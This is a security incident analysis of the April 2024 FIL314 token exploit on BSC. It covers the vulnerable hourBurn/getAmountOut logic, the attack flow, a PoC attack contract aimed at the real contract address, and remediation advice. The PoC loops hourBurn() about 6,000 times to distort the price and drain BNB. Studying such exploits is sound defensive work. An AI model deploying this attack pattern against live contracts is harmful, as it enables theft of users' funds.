# FIL314 — hourBurn Repeated-Call Token Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | FIL314 |
| **Chain** | BSC |
| **Loss** | ~14 BNB |
| **Attacker** | [0x4645863](https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c) |
| **Attack Contract 1** | [0xde521fbb](https://bscscan.com/address/0xde521fbbbb0dbcfa57325a9896c34941f23e96a0) |
| **Attack Contract 2** | [0x5C01B972](https://bscscan.com/address/0x5C01B97299b32BaF75B4940fDaE158656C231847) |
| **Vulnerable Contract** | [FIL314 0xE8A290c6](https://bscscan.com/address/0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF) |
| **Root Cause** | Repeatedly calling `hourBurn()` ~6,000 times burns the token supply, distorting the spot price calculation in `getAmountOut()`, enabling excessive BNB withdrawal via subsequent `transfer()` calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/FIL314_exp.sol) |

---

## 1. Vulnerability Overview

FIL314 is a token with a built-in AMM following the ERC-314 pattern, where `hourBurn()` burns tokens and `getAmountOut()` calculates BNB output based on the token balance. The attacker called `hourBurn()` thousands of times to reduce the circulating supply, causing the BNB amount returned by `getAmountOut()` to become distorted — allowing excessive BNB to be received by transferring a small amount of tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no hourBurn cooldown/limit + getAmountOut spot dependency
contract FIL314 {
    uint256 public totalSupply;

    // No cooldown — anyone can call repeatedly
    function hourBurn() external {
        uint256 burnAmount = totalSupply / 1000;
        _burn(address(this), burnAmount);
    }

    // Spot reserve-based price — manipulable
    function getAmountOut(uint256 value, bool _buy) public view returns (uint256) {
        uint256 tokenReserve = balanceOf(address(this));
        uint256 ethReserve   = address(this).balance;
        if (_buy) {
            return (value * tokenReserve) / (ethReserve + value);
        } else {
            return (value * ethReserve) / (tokenReserve + value);
            // ← BNB output increases as tokenReserve decreases
        }
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        if (to == address(this)) {
            // Token → BNB sell
            uint256 ethAmount = getAmountOut(value, false);
            _transfer(msg.sender, address(this), value);
            payable(msg.sender).transfer(ethAmount);
        }
        // ...
    }
}

// ✅ Safe code: hourBurn cooldown + call cap
mapping(address => uint256) public lastHourBurn;

function hourBurn() external {
    require(block.timestamp >= lastHourBurn[msg.sender] + 1 hours, "cooldown");
    lastHourBurn[msg.sender] = block.timestamp;
    uint256 burnAmount = totalSupply / 1000;
    require(burnAmount <= MAX_BURN_PER_CALL, "burn limit exceeded");
    _burn(address(this), burnAmount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: FIL314_decompiled.sol
contract FIL314 {
    function hourBurn() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Send 0.05 BNB → Buy FIL314 tokens
  │
  ├─→ [2] Call hourBurn() ~6,000 times
  │         └─ tokenReserve decreases significantly
  │         └─ getAmountOut(sell) return value increases
  │
  ├─→ [3] Confirm manipulated price via getAmountOut()
  │
  ├─→ [4] transfer(FIL314Contract, tokenAmount)
  │         └─ Receive BNB at manipulated price
  │
  └─→ [5] ~14 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IFIL314 {
    function hourBurn() external;
    function getAmountOut(uint256 value, bool _buy) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract AttackContract {
    IFIL314 constant fil = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);

    function testExploit() external payable {
        // [1] Buy FIL314 tokens with 0.05 BNB
        (bool ok,) = address(fil).call{value: 0.05 ether}("");
        require(ok);

        // [2] hourBurn x6000 → reduce tokenReserve
        for (uint i = 0; i < 6000; i++) {
            fil.hourBurn();
        }

        // [3] Sell at manipulated price for BNB
        uint256 tokenBal = IERC20(address(fil)).balanceOf(address(this));
        uint256 ethOut = fil.getAmountOut(tokenBal, false);
        // Sending tokenBal receives ethOut BNB
        fil.transfer(address(fil), tokenBal);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Spot price manipulation via repeated burns |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated hourBurn + getAmountOut manipulation) |
| **DApp Category** | ERC-314 self-AMM token |
| **Impact** | AMM reserve drain (~14 BNB) |

## 6. Remediation Recommendations

1. **hourBurn Cooldown**: Limit calls to once per hour per address
2. **Burn Amount Cap**: Limit maximum burn amount per single call
3. **TWAP-Based Pricing**: Compute `getAmountOut()` using TWAP instead of spot reserves
4. **Global Burn Accumulation Limit**: Apply a global per-block burn allowance cap

## 7. Lessons Learned

- In the ERC-314 self-AMM pattern, internal reserves directly determine price, making burn mechanisms a potential price manipulation vector.
- A burn function without a cooldown is vulnerable to loop attacks, allowing reserve ratios to be arbitrarily manipulated through thousands of calls.
- Custom AMM implementations should follow the same manipulation-resistant design principles as Uniswap V2 (minimum liquidity, reserve update patterns).